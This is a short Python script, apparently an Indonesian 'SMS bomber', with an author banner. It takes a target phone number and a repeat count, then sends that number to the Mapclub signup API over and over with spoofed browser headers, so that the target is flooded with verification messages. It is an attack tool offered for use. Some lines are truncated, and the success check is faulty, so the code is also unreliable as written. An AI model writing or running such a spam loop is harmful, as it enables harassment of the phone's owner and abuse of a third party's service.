import json

import requests

import sys

import os

def main():

        os.system('clear')

        os.system('figlet SEZN15')

        banner = '''

        [+]Author : Sanzu Eakkk15

        [+]Instagram : adhtyaprtm__

        '''

        print(banner)

        no = input('target : ')

        jum = input('jumlah spam : ')

        head = {

        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) Apple>

        "Referer": "https://www.mapclub.com/en/user/signup",

        "Host": "cmsapi.mapclub.com",

        }

        dat = {

        'phone' : no

        }

        for x in range(int(jum)):

                leosureo = requests.post("https://cmsapi.mapclub.com/a>

        if 'eror' in leosureo:

                print('gagal mengirim' + no)

        else:

                print('sukses mengirim' + no)

main()
